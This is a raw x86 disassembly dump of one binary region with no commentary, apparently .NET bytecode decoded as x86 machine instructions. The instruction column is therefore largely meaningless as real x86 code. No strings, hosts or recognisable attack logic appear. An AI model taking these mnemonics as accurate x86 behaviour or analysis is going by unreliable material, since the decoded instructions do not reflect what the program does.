  402ba9:	28 08                	sub    %cl,(%eax)
  402bab:	00 00                	add    %al,(%eax)
  402bad:	06                   	push   %es
  402bae:	28 0a                	sub    %cl,(%edx)
  402bb0:	00 00                	add    %al,(%eax)
  402bb2:	06                   	push   %es
  402bb3:	28 0e                	sub    %cl,(%esi)
  402bb5:	00 00                	add    %al,(%eax)
  402bb7:	06                   	push   %es
  402bb8:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402bbe:	69 14 fe 06 1d 00 00 	imul   $0x1d06,(%esi,%edi,8),%edx
  402bc5:	06                   	push   %es
  402bc6:	73 3c                	jae    0x402c04
  402bc8:	00 00                	add    %al,(%eax)
  402bca:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  402bcd:	3d 00 00 0a 26       	cmp    $0x260a0000,%eax
  402bd2:	2b 06                	sub    (%esi),%eax
  402bd4:	16                   	push   %ss
  402bd5:	28 13                	sub    %dl,(%ebx)
  402bd7:	00 00                	add    %al,(%eax)
  402bd9:	06                   	push   %es
  402bda:	de 09                	fimuls (%ecx)
  402bdc:	26 16                	es push %ss
  402bde:	28 13                	sub    %dl,(%ebx)
  402be0:	00 00                	add    %al,(%eax)
  402be2:	06                   	push   %es
  402be3:	de 00                	fiadds (%eax)
  402be5:	2a 00                	sub    (%eax),%al
  402be7:	00 41 4c             	add    %al,0x4c(%ecx)
  402bea:	00 00                	add    %al,(%eax)
  402bec:	00 00                	add    %al,(%eax)
  402bee:	00 00                	add    %al,(%eax)
  402bf0:	c4 00                	les    (%eax),%eax
  402bf2:	00 00                	add    %al,(%eax)
  402bf4:	20 00                	and    %al,(%eax)
  402bf6:	00 00                	add    %al,(%eax)
  402bf8:	e4 00                	in     $0x0,%al
  402bfa:	00 00                	add    %al,(%eax)
  402bfc:	03 00                	add    (%eax),%eax
  402bfe:	00 00                	add    %al,(%eax)
  402c00:	01 00                	add    %eax,(%eax)
  402c02:	00 01                	add    %al,(%ecx)
  402c04:	02 00                	add    (%eax),%al
  402c06:	00 00                	add    %al,(%eax)
  402c08:	0e                   	push   %cs
  402c09:	01 00                	add    %eax,(%eax)
  402c0b:	00 77 00             	add    %dh,0x0(%edi)
  402c0e:	00 00                	add    %al,(%eax)
  402c10:	85 01                	test   %eax,(%ecx)
  402c12:	00 00                	add    %al,(%eax)
  402c14:	0c 00                	or     $0x0,%al
	...
  402c22:	00 00                	add    %al,(%eax)
  402c24:	94                   	xchg   %eax,%esp
  402c25:	02 00                	add    (%eax),%al
  402c27:	00 94 02 00 00 09 00 	add    %dl,0x90000(%edx,%eax,1)
  402c2e:	00 00                	add    %al,(%eax)
  402c30:	01 00                	add    %eax,(%eax)
  402c32:	00 01                	add    %al,(%ecx)
  402c34:	1b 30                	sbb    (%eax),%esi
  402c36:	02 00                	add    (%eax),%al
  402c38:	46                   	inc    %esi
  402c39:	00 00                	add    %al,(%eax)
  402c3b:	00 00                	add    %al,(%eax)
  402c3d:	00 00                	add    %al,(%eax)
  402c3f:	00 28                	add    %ch,(%eax)
  402c41:	15 00 00 06 25       	adc    $0x25060000,%eax
  402c46:	2d 03 26 2b 05       	sub    $0x52b2603,%eax
  402c4b:	28 40 00             	sub    %al,0x0(%eax)
  402c4e:	00 0a                	add    %cl,(%edx)
  402c50:	28 10                	sub    %dl,(%eax)
  402c52:	00 00                	add    %al,(%eax)
  402c54:	06                   	push   %es
  402c55:	25 2d 03 26 2b       	and    $0x2b26032d,%eax
  402c5a:	05 28 40 00 00       	add    $0x4028,%eax
  402c5f:	0a 28                	or     (%eax),%ch
  402c61:	08 00                	or     %al,(%eax)
  402c63:	00 06                	add    %al,(%esi)
  402c65:	25 2d 03 26 2b       	and    $0x2b26032d,%eax
  402c6a:	05 28 41 00 00       	add    $0x4128,%eax
  402c6f:	0a 28                	or     (%eax),%ch
  402c71:	06                   	push   %es
  402c72:	00 00                	add    %al,(%eax)
  402c74:	06                   	push   %es
  402c75:	25 2d 03 26 2b       	and    $0x2b26032d,%eax
  402c7a:	05 28 42 00 00       	add    $0x4228,%eax
  402c7f:	0a de                	or     %dh,%bl
  402c81:	03 26                	add    (%esi),%esp
  402c83:	de 00                	fiadds (%eax)
  402c85:	2a 00                	sub    (%eax),%al
  402c87:	00 01                	add    %al,(%ecx)
  402c89:	10 00                	adc    %al,(%eax)
  402c8b:	00 00                	add    %al,(%eax)
  402c8d:	00 00                	add    %al,(%eax)
  402c8f:	00 42 42             	add    %al,0x42(%edx)
  402c92:	00 03                	add    %al,(%ebx)
  402c94:	01 00                	add    %eax,(%eax)
  402c96:	00 01                	add    %al,(%ecx)
  402c98:	1b 30                	sbb    (%eax),%esi
  402c9a:	06                   	push   %es
  402c9b:	00 96 01 00 00 04    	add    %dl,0x4000001(%esi)
  402ca1:	00 00                	add    %al,(%eax)
  402ca3:	11 28                	adc    %ebp,(%eax)
  402ca5:	06                   	push   %es
  402ca6:	00 00                	add    %al,(%eax)
  402ca8:	06                   	push   %es
  402ca9:	6f                   	outsl  %ds:(%esi),(%dx)
  402caa:	2c 00                	sub    $0x0,%al
  402cac:	00 0a                	add    %cl,(%edx)
  402cae:	2c 07                	sub    $0x7,%al
  402cb0:	28 12                	sub    %dl,(%edx)
  402cb2:	00 00                	add    %al,(%eax)
  402cb4:	06                   	push   %es
  402cb5:	2d 0b 16 28 13       	sub    $0x1328160b,%eax
  402cba:	00 00                	add    %al,(%eax)
  402cbc:	06                   	push   %es
  402cbd:	dd 77 01             	fnsave 0x1(%edi)
  402cc0:	00 00                	add    %al,(%eax)
  402cc2:	28 08                	sub    %cl,(%eax)
  402cc4:	00 00                	add    %al,(%eax)
  402cc6:	06                   	push   %es
  402cc7:	02 6f 43             	add    0x43(%edi),%ch
  402cca:	00 00                	add    %al,(%eax)
  402ccc:	0a 0a                	or     (%edx),%cl
  402cce:	06                   	push   %es
  402ccf:	16                   	push   %ss
  402cd0:	3e 53                	ds push %ebx
  402cd2:	01 00                	add    %eax,(%eax)
  402cd4:	00 28                	add    %ch,(%eax)
  402cd6:	0e                   	push   %cs
  402cd7:	00 00                	add    %al,(%eax)
  402cd9:	06                   	push   %es
  402cda:	06                   	push   %es
  402cdb:	6a 58                	push   $0x58
  402cdd:	28 0f                	sub    %cl,(%edi)
  402cdf:	00 00                	add    %al,(%eax)
  402ce1:	06                   	push   %es
  402ce2:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402ce5:	00 06                	add    %al,(%esi)
  402ce7:	06                   	push   %es
  402ce8:	6a 59                	push   $0x59
  402cea:	28 0d 00 00 06 28    	sub    %cl,0x28060000
  402cf0:	0c 00                	or     $0x0,%al
  402cf2:	00 06                	add    %al,(%esi)
  402cf4:	3a f3                	cmp    %bl,%dh
  402cf6:	00 00                	add    %al,(%eax)
  402cf8:	00 28                	add    %ch,(%eax)
  402cfa:	0a 00                	or     (%eax),%al
  402cfc:	00 06                	add    %al,(%esi)
  402cfe:	16                   	push   %ss
  402cff:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  402d03:	0a 6a 28             	or     0x28(%edx),%ch
  402d06:	0d 00 00 06 28       	or     $0x28060000,%eax
  402d0b:	0c 00                	or     $0x0,%al
  402d0d:	00 06                	add    %al,(%esi)
  402d0f:	16                   	push   %ss
  402d10:	6a 3e                	push   $0x3e
  402d12:	b6 00                	mov    $0x0,%dh
  402d14:	00 00                	add    %al,(%eax)
  402d16:	16                   	push   %ss
  402d17:	6a 28                	push   $0x28
  402d19:	0f 00 00             	sldt   (%eax)
  402d1c:	06                   	push   %es
  402d1d:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402d20:	00 06                	add    %al,(%esi)
  402d22:	d4 8d                	aam    $0x8d
  402d24:	44                   	inc    %esp
  402d25:	00 00                	add    %al,(%eax)
  402d27:	01 28                	add    %ebp,(%eax)
  402d29:	0b 00                	or     (%eax),%eax
  402d2b:	00 06                	add    %al,(%esi)
  402d2d:	2b 59 28             	sub    0x28(%ecx),%ebx
  402d30:	08 00                	or     %al,(%eax)
  402d32:	00 06                	add    %al,(%esi)
  402d34:	28 0a                	sub    %cl,(%edx)
  402d36:	00 00                	add    %al,(%eax)
  402d38:	06                   	push   %es
  402d39:	28 0e                	sub    %cl,(%esi)
  402d3b:	00 00                	add    %al,(%eax)
  402d3d:	06                   	push   %es
  402d3e:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402d44:	69 6f 45 00 00 0a 0b 	imul   $0xb0a0000,0x45(%edi),%ebp
  402d4b:	07                   	pop    %es
  402d4c:	16                   	push   %ss
  402d4d:	30 0b                	xor    %cl,(%ebx)
  402d4f:	16                   	push   %ss
  402d50:	28 13                	sub    %dl,(%ebx)
  402d52:	00 00                	add    %al,(%eax)
  402d54:	06                   	push   %es
  402d55:	dd df                	fstp   %st(7)
  402d57:	00 00                	add    %al,(%eax)
  402d59:	00 28                	add    %ch,(%eax)
  402d5b:	0e                   	push   %cs
  402d5c:	00 00                	add    %al,(%eax)
  402d5e:	06                   	push   %es
  402d5f:	07                   	pop    %es
  402d60:	6a 58                	push   $0x58
  402d62:	28 0f                	sub    %cl,(%edi)
  402d64:	00 00                	add    %al,(%eax)
  402d66:	06                   	push   %es
  402d67:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402d6a:	00 06                	add    %al,(%esi)
  402d6c:	07                   	pop    %es
  402d6d:	6a 59                	push   $0x59
  402d6f:	28 0d 00 00 06 28    	sub    %cl,0x28060000
  402d75:	0c 00                	or     $0x0,%al
  402d77:	00 06                	add    %al,(%esi)
  402d79:	16                   	push   %ss
  402d7a:	6a 2f                	push   $0x2f
  402d7c:	0b 16                	or     (%esi),%edx
  402d7e:	28 13                	sub    %dl,(%ebx)
  402d80:	00 00                	add    %al,(%eax)
  402d82:	06                   	push   %es
  402d83:	dd b1 00 00 00 28    	fnsave 0x28000000(%ecx)
  402d89:	0c 00                	or     $0x0,%al
  402d8b:	00 06                	add    %al,(%esi)
  402d8d:	16                   	push   %ss
  402d8e:	6a 30                	push   $0x30
  402d90:	9e                   	sahf
  402d91:	14 fe                	adc    $0xfe,%al
  402d93:	06                   	push   %es
  402d94:	92                   	xchg   %eax,%edx
  402d95:	00 00                	add    %al,(%eax)
  402d97:	06                   	push   %es
  402d98:	73 46                	jae    0x402de0
  402d9a:	00 00                	add    %al,(%eax)
  402d9c:	0a 73 47             	or     0x47(%ebx),%dh
  402d9f:	00 00                	add    %al,(%eax)
  402da1:	0a 28                	or     (%eax),%ch
  402da3:	0a 00                	or     (%eax),%al
  402da5:	00 06                	add    %al,(%esi)
  402da7:	6f                   	outsl  %ds:(%esi),(%dx)
  402da8:	48                   	dec    %eax
  402da9:	00 00                	add    %al,(%eax)
  402dab:	0a 16                	or     (%esi),%dl
  402dad:	6a 28                	push   $0x28
  402daf:	0f 00 00             	sldt   (%eax)
  402db2:	06                   	push   %es
  402db3:	1a 6a 28             	sbb    0x28(%edx),%ch
  402db6:	0d 00 00 06 28       	or     $0x28060000,%eax
  402dbb:	0c 00                	or     $0x0,%al
  402dbd:	00 06                	add    %al,(%esi)
  402dbf:	d4 8d                	aam    $0x8d
  402dc1:	44                   	inc    %esp
  402dc2:	00 00                	add    %al,(%eax)
  402dc4:	01 28                	add    %ebp,(%eax)
  402dc6:	0b 00                	or     (%eax),%eax
  402dc8:	00 06                	add    %al,(%esi)
  402dca:	2b 31                	sub    (%ecx),%esi
  402dcc:	1a 6a 28             	sbb    0x28(%edx),%ch
  402dcf:	0d 00 00 06 28       	or     $0x28060000,%eax
  402dd4:	0c 00                	or     $0x0,%al
  402dd6:	00 06                	add    %al,(%esi)
  402dd8:	d4 8d                	aam    $0x8d
  402dda:	44                   	inc    %esp
  402ddb:	00 00                	add    %al,(%eax)
  402ddd:	01 28                	add    %ebp,(%eax)
  402ddf:	0b 00                	or     (%eax),%eax
  402de1:	00 06                	add    %al,(%esi)
  402de3:	16                   	push   %ss
  402de4:	6a 28                	push   $0x28
  402de6:	0f 00 00             	sldt   (%eax)
  402de9:	06                   	push   %es
  402dea:	2b 11                	sub    (%ecx),%edx
  402dec:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402def:	00 06                	add    %al,(%esi)
  402df1:	16                   	push   %ss
  402df2:	6a 2f                	push   $0x2f
  402df4:	08 16                	or     %dl,(%esi)
  402df6:	28 13                	sub    %dl,(%ebx)
  402df8:	00 00                	add    %al,(%eax)
  402dfa:	06                   	push   %es
  402dfb:	de 3c 28             	fidivrs (%eax,%ebp,1)
  402dfe:	08 00                	or     %al,(%eax)
  402e00:	00 06                	add    %al,(%esi)
  402e02:	28 0a                	sub    %cl,(%edx)
  402e04:	00 00                	add    %al,(%eax)
  402e06:	06                   	push   %es
  402e07:	28 0e                	sub    %cl,(%esi)
  402e09:	00 00                	add    %al,(%eax)
  402e0b:	06                   	push   %es
  402e0c:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402e12:	69 14 fe 06 1d 00 00 	imul   $0x1d06,(%esi,%edi,8),%edx
  402e19:	06                   	push   %es
  402e1a:	73 3c                	jae    0x402e58
  402e1c:	00 00                	add    %al,(%eax)
  402e1e:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  402e21:	3d 00 00 0a 26       	cmp    $0x260a0000,%eax
  402e26:	2b 06                	sub    (%esi),%eax
  402e28:	16                   	push   %ss
  402e29:	28 13                	sub    %dl,(%ebx)
  402e2b:	00 00                	add    %al,(%eax)
  402e2d:	06                   	push   %es
  402e2e:	de 09                	fimuls (%ecx)
  402e30:	26 16                	es push %ss
  402e32:	28 13                	sub    %dl,(%ebx)
  402e34:	00 00                	add    %al,(%eax)
  402e36:	06                   	push   %es
  402e37:	de 00                	fiadds (%eax)
  402e39:	2a 00                	sub    (%eax),%al
  402e3b:	00 41 1c             	add    %al,0x1c(%ecx)
	...
  402e46:	00 00                	add    %al,(%eax)
  402e48:	8c 01                	mov    %es,(%ecx)
  402e4a:	00 00                	add    %al,(%eax)
  402e4c:	8c 01                	mov    %es,(%ecx)
  402e4e:	00 00                	add    %al,(%eax)
  402e50:	09 00                	or     %eax,(%eax)
  402e52:	00 00                	add    %al,(%eax)
  402e54:	01 00                	add    %eax,(%eax)
  402e56:	00 01                	add    %al,(%ecx)
  402e58:	1b 30                	sbb    (%eax),%esi
  402e5a:	04 00                	add    $0x0,%al
  402e5c:	e5 00                	in     $0x0,%eax
  402e5e:	00 00                	add    %al,(%eax)
  402e60:	05 00 00 11 28       	add    $0x28110000,%eax
  402e65:	14 00                	adc    $0x0,%al
  402e67:	00 06                	add    %al,(%esi)
  402e69:	0a 16                	or     (%esi),%dl
  402e6b:	0b 06                	or     (%esi),%eax
  402e6d:	12 01                	adc    (%ecx),%al
  402e6f:	28 49 00             	sub    %cl,0x0(%ecx)
  402e72:	00 0a                	add    %cl,(%edx)
  402e74:	28 12                	sub    %dl,(%edx)
  402e76:	00 00                	add    %al,(%eax)
  402e78:	06                   	push   %es
  402e79:	2c 03                	sub    $0x3,%al
  402e7b:	02 2d 05 dd c5 00    	add    0xc5dd05,%ch
  402e81:	00 00                	add    %al,(%eax)
  402e83:	02 8e 69 28 4a 00    	add    0x4a2869(%esi),%cl
  402e89:	00 0a                	add    %cl,(%edx)
  402e8b:	0c 28                	or     $0x28,%al
  402e8d:	06                   	push   %es
  402e8e:	00 00                	add    %al,(%eax)
  402e90:	06                   	push   %es
  402e91:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402e96:	00 0a                	add    %cl,(%edx)
  402e98:	26 28 08             	sub    %cl,%es:(%eax)
  402e9b:	00 00                	add    %al,(%eax)
  402e9d:	06                   	push   %es
  402e9e:	08 16                	or     %dl,(%esi)
  402ea0:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  402ea6:	00 0a                	add    %cl,(%edx)
  402ea8:	02 8e 69 20 40 42    	add    0x42402069(%esi),%cl
  402eae:	0f 00                	(bad)
  402eb0:	31 5b 02             	xor    %ebx,0x2(%ebx)
  402eb3:	73 4d                	jae    0x402f02
  402eb5:	00 00                	add    %al,(%eax)
  402eb7:	0a 0d 16 13 04 09    	or     0x9041316,%cl
  402ebd:	16                   	push   %ss
  402ebe:	6a 6f                	push   $0x6f
  402ec0:	4e                   	dec    %esi
  402ec1:	00 00                	add    %al,(%eax)
  402ec3:	0a 20                	or     (%eax),%ah
  402ec5:	50                   	push   %eax
  402ec6:	c3                   	ret
  402ec7:	00 00                	add    %al,(%eax)
  402ec9:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  402ecd:	01 13                	add    %edx,(%ebx)
  402ecf:	05 2b 1c 28 06       	add    $0x6281c2b,%eax
  402ed4:	00 00                	add    %al,(%eax)
  402ed6:	06                   	push   %es
  402ed7:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402edc:	00 0a                	add    %cl,(%edx)
  402ede:	26 28 08             	sub    %cl,%es:(%eax)
  402ee1:	00 00                	add    %al,(%eax)
  402ee3:	06                   	push   %es
  402ee4:	11 05 16 11 04 6f    	adc    %eax,0x6f041116
  402eea:	4c                   	dec    %esp
  402eeb:	00 00                	add    %al,(%eax)
  402eed:	0a 09                	or     (%ecx),%cl
  402eef:	11 05 16 11 05 8e    	adc    %eax,0x8e051116
  402ef5:	69 6f 45 00 00 0a 25 	imul   $0x250a0000,0x45(%edi),%ebp
  402efc:	13 04 16             	adc    (%esi,%edx,1),%eax
  402eff:	30 d1                	xor    %dl,%cl
  402f01:	de 30                	fidivs (%eax)
  402f03:	09 2c 06             	or     %ebp,(%esi,%eax,1)
  402f06:	09 6f 33             	or     %ebp,0x33(%edi)
  402f09:	00 00                	add    %al,(%eax)
  402f0b:	0a dc                	or     %ah,%bl
  402f0d:	28 06                	sub    %al,(%esi)
  402f0f:	00 00                	add    %al,(%eax)
  402f11:	06                   	push   %es
  402f12:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402f17:	00 0a                	add    %cl,(%edx)
  402f19:	26 28 08             	sub    %cl,%es:(%eax)
  402f1c:	00 00                	add    %al,(%eax)
  402f1e:	06                   	push   %es
  402f1f:	02 16                	add    (%esi),%dl
  402f21:	02 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%cl
  402f27:	00 0a                	add    %cl,(%edx)
  402f29:	28 08                	sub    %cl,(%eax)
  402f2b:	00 00                	add    %al,(%eax)
  402f2d:	06                   	push   %es
  402f2e:	6f                   	outsl  %ds:(%esi),(%dx)
  402f2f:	4f                   	dec    %edi
  402f30:	00 00                	add    %al,(%eax)
  402f32:	0a de                	or     %dh,%bl
  402f34:	13 26                	adc    (%esi),%esp
  402f36:	16                   	push   %ss
  402f37:	28 13                	sub    %dl,(%ebx)
  402f39:	00 00                	add    %al,(%eax)
  402f3b:	06                   	push   %es
  402f3c:	de 0a                	fimuls (%edx)
  402f3e:	07                   	pop    %es
  402f3f:	2c 06                	sub    $0x6,%al
  402f41:	06                   	push   %es
  402f42:	28 50 00             	sub    %dl,0x0(%eax)
  402f45:	00 0a                	add    %cl,(%edx)
  402f47:	dc 2a                	fsubrl (%edx)
  402f49:	00 00                	add    %al,(%eax)
  402f4b:	00 01                	add    %al,(%ecx)
  402f4d:	28 00                	sub    %al,(%eax)
  402f4f:	00 02                	add    %al,(%edx)
  402f51:	00 55 00             	add    %dl,0x0(%ebp)
  402f54:	4a                   	dec    %edx
  402f55:	9f                   	lahf
  402f56:	00 0a                	add    %cl,(%edx)
  402f58:	00 00                	add    %al,(%eax)
  402f5a:	00 00                	add    %al,(%eax)
  402f5c:	00 00                	add    %al,(%eax)
  402f5e:	10 00                	adc    %al,(%eax)
  402f60:	c1 d1 00             	rcl    $0x0,%ecx
  402f63:	09 01                	or     %eax,(%ecx)
  402f65:	00 00                	add    %al,(%eax)
  402f67:	01 02                	add    %eax,(%edx)
  402f69:	00 08                	add    %cl,(%eax)
  402f6b:	00 d2                	add    %dl,%dl
  402f6d:	da 00                	fiaddl (%eax)
  402f6f:	0a 00                	or     (%eax),%al
  402f71:	00 00                	add    %al,(%eax)
  402f73:	00 13                	add    %dl,(%ebx)
  402f75:	30 05 00 86 00 00    	xor    %al,0x8600
  402f7b:	00 00                	add    %al,(%eax)
  402f7d:	00 00                	add    %al,(%eax)
  402f7f:	00 73 62             	add    %dh,0x62(%ebx)
  402f82:	00 00                	add    %al,(%eax)
  402f84:	06                   	push   %es
  402f85:	25 72 d1 20 00       	and    $0x20d172,%eax
  402f8a:	70 6f                	jo     0x402ffb
  402f8c:	4d                   	dec    %ebp
  402f8d:	00 00                	add    %al,(%eax)
  402f8f:	06                   	push   %es
  402f90:	72 df                	jb     0x402f71
  402f92:	20 00                	and    %al,(%eax)
  402f94:	70 6f                	jo     0x403005
  402f96:	5a                   	pop    %edx
  402f97:	00 00                	add    %al,(%eax)
  402f99:	06                   	push   %es
  402f9a:	25 72 e9 20 00       	and    $0x20e972,%eax
  402f9f:	70 6f                	jo     0x403010
  402fa1:	4d                   	dec    %ebp
  402fa2:	00 00                	add    %al,(%eax)
  402fa4:	06                   	push   %es
  402fa5:	72 f9                	jb     0x402fa0
  402fa7:	20 00                	and    %al,(%eax)
  402fa9:	70 7e                	jo     0x403029
  402fab:	10 00                	adc    %al,(%eax)
  402fad:	00 04 28             	add    %al,(%eax,%ebp,1)
  402fb0:	8e 00                	mov    (%eax),%es
  402fb2:	00 06                	add    %al,(%esi)
  402fb4:	25 2d 06 26 72       	and    $0x7226062d,%eax
  402fb9:	07                   	pop    %es
  402fba:	21 00                	and    %eax,(%eax)
  402fbc:	70 28                	jo     0x402fe6
  402fbe:	51                   	push   %ecx
  402fbf:	00 00                	add    %al,(%eax)
  402fc1:	0a 6f 5a             	or     0x5a(%edi),%ch
  402fc4:	00 00                	add    %al,(%eax)
  402fc6:	06                   	push   %es
  402fc7:	6f                   	outsl  %ds:(%esi),(%dx)
  402fc8:	57                   	push   %edi
  402fc9:	00 00                	add    %al,(%eax)
  402fcb:	06                   	push   %es
  402fcc:	28 1e                	sub    %bl,(%esi)
  402fce:	00 00                	add    %al,(%eax)
  402fd0:	06                   	push   %es
  402fd1:	28 15 00 00 06 25    	sub    %dl,0x25060000
  402fd7:	2d 03 26 2b 05       	sub    $0x52b2603,%eax
  402fdc:	28 40 00             	sub    %al,0x0(%eax)
  402fdf:	00 0a                	add    %cl,(%edx)
  402fe1:	16                   	push   %ss
  402fe2:	28 18                	sub    %bl,(%eax)
  402fe4:	00 00                	add    %al,(%eax)
  402fe6:	06                   	push   %es
  402fe7:	14 fe                	adc    $0xfe,%al
  402fe9:	06                   	push   %es
  402fea:	20 00                	and    %al,(%eax)
  402fec:	00 06                	add    %al,(%esi)
  402fee:	73 3a                	jae    0x40302a
  402ff0:	00 00                	add    %al,(%eax)
  402ff2:	0a 14 17             	or     (%edi,%edx,1),%dl
  402ff5:	17                   	pop    %ss
  402ff6:	73 3b                	jae    0x403033
  402ff8:	00 00                	add    %al,(%eax)
  402ffa:	0a 28                	or     (%eax),%ch
  402ffc:	16                   	push   %ss
  402ffd:	00 00                	add    %al,(%eax)
  402fff:	06                   	push   %es
  403000:	28 52 00             	sub    %dl,0x0(%edx)
  403003:	00 0a                	add    %cl,(%edx)
  403005:	2a 00                	sub    (%eax),%al
  403007:	00 13                	add    %dl,(%ebx)
  403009:	30 03                	xor    %al,(%ebx)
  40300b:	00 38                	add    %bh,(%eax)
  40300d:	00 00                	add    %al,(%eax)
  40300f:	00 06                	add    %al,(%esi)
  403011:	00 00                	add    %al,(%eax)
  403013:	11 73 53             	adc    %esi,0x53(%ebx)
  403016:	00 00                	add    %al,(%eax)
  403018:	0a 0a                	or     (%edx),%cl
  40301a:	02 0b                	add    (%ebx),%cl
  40301c:	16                   	push   %ss
  40301d:	0c 2b                	or     $0x2b,%al
  40301f:	1f                   	pop    %ds
  403020:	07                   	pop    %es
  403021:	08 91 0d 06 72 0b    	or     %dl,0xb72060d(%ecx)
  403027:	21 00                	and    %eax,(%eax)
  403029:	70 09                	jo     0x403034
  40302b:	8c 44 00 00          	mov    %es,0x0(%eax,%eax,1)
  40302f:	01 28                	add    %ebp,(%eax)
  403031:	54                   	push   %esp
  403032:	00 00                	add    %al,(%eax)
  403034:	0a 6f 55             	or     0x55(%edi),%ch
  403037:	00 00                	add    %al,(%eax)
  403039:	0a 26                	or     (%esi),%ah
  40303b:	08 17                	or     %dl,(%edi)
  40303d:	58                   	pop    %eax
  40303e:	0c 08                	or     $0x8,%al
  403040:	07                   	pop    %es
  403041:	8e 69 32             	mov    0x32(%ecx),%gs
  403044:	db 06                	fildl  (%esi)
  403046:	6f                   	outsl  %ds:(%esi),(%dx)
  403047:	38 00                	cmp    %al,(%eax)
  403049:	00 0a                	add    %cl,(%edx)
  40304b:	2a 13                	sub    (%ebx),%dl
  40304d:	30 03                	xor    %al,(%ebx)
  40304f:	00 38                	add    %bh,(%eax)
  403051:	00 00                	add    %al,(%eax)
  403053:	00 06                	add    %al,(%esi)
  403055:	00 00                	add    %al,(%eax)
  403057:	11 73 53             	adc    %esi,0x53(%ebx)
  40305a:	00 00                	add    %al,(%eax)
  40305c:	0a 0a                	or     (%edx),%cl
  40305e:	02 0b                	add    (%ebx),%cl
  403060:	16                   	push   %ss
  403061:	0c 2b                	or     $0x2b,%al
  403063:	1f                   	pop    %ds
  403064:	07                   	pop    %es
  403065:	08 91 0d 06 72 1b    	or     %dl,0x1b72060d(%ecx)
  40306b:	21 00                	and    %eax,(%eax)
  40306d:	70 09                	jo     0x403078
  40306f:	8c 44 00 00          	mov    %es,0x0(%eax,%eax,1)
  403073:	01 28                	add    %ebp,(%eax)
  403075:	54                   	push   %esp
  403076:	00 00                	add    %al,(%eax)
  403078:	0a 6f 55             	or     0x55(%edi),%ch
  40307b:	00 00                	add    %al,(%eax)
  40307d:	0a 26                	or     (%esi),%ah
  40307f:	08 17                	or     %dl,(%edi)
  403081:	58                   	pop    %eax
  403082:	0c 08                	or     $0x8,%al
  403084:	07                   	pop    %es
  403085:	8e 69 32             	mov    0x32(%ecx),%gs
  403088:	db 06                	fildl  (%esi)
  40308a:	6f                   	outsl  %ds:(%esi),(%dx)
  40308b:	38 00                	cmp    %al,(%eax)
  40308d:	00 0a                	add    %cl,(%edx)
  40308f:	2a 13                	sub    (%ebx),%dl
  403091:	30 04 00             	xor    %al,(%eax,%eax,1)
  403094:	29 00                	sub    %eax,(%eax)
  403096:	00 00                	add    %al,(%eax)
  403098:	07                   	pop    %es
  403099:	00 00                	add    %al,(%eax)
  40309b:	11 02                	adc    %eax,(%edx)
  40309d:	8e 69 8d             	mov    -0x73(%ecx),%gs
  4030a0:	44                   	inc    %esp
  4030a1:	00 00                	add    %al,(%eax)
  4030a3:	01 0a                	add    %ecx,(%edx)
  4030a5:	02 8e 69 17 59 0b    	add    0xb591769(%esi),%cl
  4030ab:	16                   	push   %ss
  4030ac:	0c 2b                	or     $0x2b,%al
  4030ae:	0e                   	push   %cs
  4030af:	06                   	push   %es
  4030b0:	08 02                	or     %al,(%edx)
  4030b2:	07                   	pop    %es
  4030b3:	91                   	xchg   %eax,%ecx
  4030b4:	9c                   	pushf
  4030b5:	07                   	pop    %es
  4030b6:	17                   	pop    %ss
  4030b7:	59                   	pop    %ecx
  4030b8:	0b 08                	or     (%eax),%ecx
  4030ba:	17                   	pop    %ss
  4030bb:	58                   	pop    %eax
  4030bc:	0c 08                	or     $0x8,%al
  4030be:	06                   	push   %es
  4030bf:	8e 69 32             	mov    0x32(%ecx),%gs
  4030c2:	ec                   	in     (%dx),%al
  4030c3:	06                   	push   %es
  4030c4:	2a 00                	sub    (%eax),%al
  4030c6:	00 00                	add    %al,(%eax)
  4030c8:	13 30                	adc    (%eax),%esi
  4030ca:	02 00                	add    (%eax),%al
  4030cc:	33 00                	xor    (%eax),%eax
  4030ce:	00 00                	add    %al,(%eax)
  4030d0:	01 00                	add    %eax,(%eax)
  4030d2:	00 11                	add    %dl,(%ecx)
  4030d4:	16                   	push   %ss
  4030d5:	0a 2b                	or     (%ebx),%ch
  4030d7:	15 02 7b 26 00       	adc    $0x267b02,%eax
  4030dc:	00 04 06             	add    %al,(%esi,%eax,1)
  4030df:	6f                   	outsl  %ds:(%esi),(%dx)
  4030e0:	59                   	pop    %ecx
  4030e1:	00 00                	add    %al,(%eax)
  4030e3:	0a 6f 39             	or     0x39(%edi),%ch
  4030e6:	00 00                	add    %al,(%eax)
  4030e8:	06                   	push   %es
  4030e9:	06                   	push   %es
  4030ea:	17                   	pop    %ss
  4030eb:	58                   	pop    %eax
  4030ec:	0a 06                	or     (%esi),%al
  4030ee:	02 7b 26             	add    0x26(%ebx),%bh
  4030f1:	00 00                	add    %al,(%eax)
  4030f3:	04 6f                	add    $0x6f,%al
  4030f5:	5a                   	pop    %edx
  4030f6:	00 00                	add    %al,(%eax)
  4030f8:	0a 32                	or     (%edx),%dh
  4030fa:	dd 02                	fldl   (%edx)
  4030fc:	7b 26                	jnp    0x403124
  4030fe:	00 00                	add    %al,(%eax)
  403100:	04 6f                	add    $0x6f,%al
  403102:	5c                   	pop    %esp
  403103:	00 00                	add    %al,(%eax)
  403105:	0a 2a                	or     (%edx),%ch
  403107:	00 13                	add    %dl,(%ebx)
  403109:	30 02                	xor    %al,(%edx)
  40310b:	00 1b                	add    %bl,(%ebx)
  40310d:	00 00                	add    %al,(%eax)
  40310f:	00 08                	add    %cl,(%eax)
  403111:	00 00                	add    %al,(%eax)
  403113:	11 73 62             	adc    %esi,0x62(%ebx)
  403116:	00 00                	add    %al,(%eax)
  403118:	06                   	push   %es
  403119:	0a 06                	or     (%esi),%al
  40311b:	02 7d 25             	add    0x25(%ebp),%bh
  40311e:	00 00                	add    %al,(%eax)
  403120:	04 02                	add    $0x2,%al
